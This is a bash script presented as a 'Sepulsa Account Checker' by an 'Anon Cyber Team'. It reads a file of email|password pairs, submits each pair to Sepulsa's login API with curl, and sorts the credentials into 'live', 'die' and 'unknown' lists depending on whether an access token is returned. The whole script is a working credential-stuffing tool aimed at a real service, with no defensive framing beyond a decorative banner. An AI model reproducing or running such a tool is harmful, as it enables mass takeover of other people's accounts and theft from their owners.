#!/bin/bash
# Sepulsa Account Checker
# Issued on 09/12/2018
# © Copyright ~ 4WSec
# Don't Delete Copyright, Bitch!

# color
PP='\033[95m' # purple
CY='\033[96m' # cyan
BL='\033[94m' # blue
GR='\033[92m' # green
YW='\033[93m' # yellow
RD='\033[91m' # red
NT='\033[97m'  # netral
O='\e[0m'
B='\e[5m'
U='\e[4m'

# date
time=`date +"%T"`

# user agent
useragent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0"

clear

function banner(){
printf "
\t${RD}${B}        #############
\t      ##############*##
\t     ################**#
\t    ########  #  ####***#
\t   ########       ###****#
\t  ##########     ####*****#
\t  ####   ##### #####   ***#
\t  ###      #######      **#
\t  ###   ${YW}X   ${RD}#####   ${YW}X   ${RD}**#
\t  ####     ## # ##     ***#
\t  ########## ### ##*******#
\t   ### ############**# ###
\t       ##-#-#-#-#-#-##
\t        ${NT}| | | | | | |${O}

\t    ${CY}Sepulsa Account Checker
\t${CY}Author: ${GR}4WSec - Anon Cyber Team

"
}


function l0g1n(){
	curl -s -L 'https://gaia.sepulsa.com/bumi/account/login' \
	-H 'User-Agent: ${useragent}' \
	-H 'Accept: application/json, text/plain, */*' \
	-H 'Accept-Language: en-US,en;q=0.5' \
	-H 'Content-Type: application/json' \
	-H 'Source: phoenix' \
	-H 'Origin: https://www.sepulsa.com' \
	-H 'Connection: keep-alive' \
	--data '{"email_or_phone_number":"'$1'","password":"'$2'"}' --compressed -o page.tmp
	if [[ $(cat page.tmp) =~ '"access_token"' ]]; then
		printf "${GR}[LIVE] $1|$2 ${YW}[Checked On ${time}] ${BL}[Acc: Sepulsa] \n"
		echo "[LIVE] $1|$2 [Checked On ${time}] [Acc: Sepulsa]" >> live.txt
	elif [[ $(cat page.tmp) =~ '"Email/Password Wrong."' ]]; then
		printf "${RD}[DIE] $1|$2 ${YW}[Checked On ${time}] ${BL}[Acc: Sepulsa]\n"
		echo "[DIE] $1|$2 [Checked On ${time}] [Acc: Sepulsa]" >> die.txt
	else
		printf "${PP}[UNKNOWN] $1|$2 ${YW}[Checked On ${time}] ${BL}[Acc: Sepulsa]\n"
		echo "[UNKNOWN] $1|$2 [Checked On ${time}] [Acc: Sepulsa]" >> unknown.txt
	fi
}
banner
read -p "Enter Mailist File: " empaz;
echo ""
if [ ! -f $empaz ]; then
	printf "${RED}$empaz Not Here!\n"
	exit
fi
for x in $(cat $empaz); do
	email=$(echo $x | cut -d "|" -f 1)
	pass=$(echo $x | cut -d "|" -f 2)
	mail=${#email}
	passwd=${#pass}
	indexer=$((con++))
	l0g1n $email $pass $mail $passwd
done
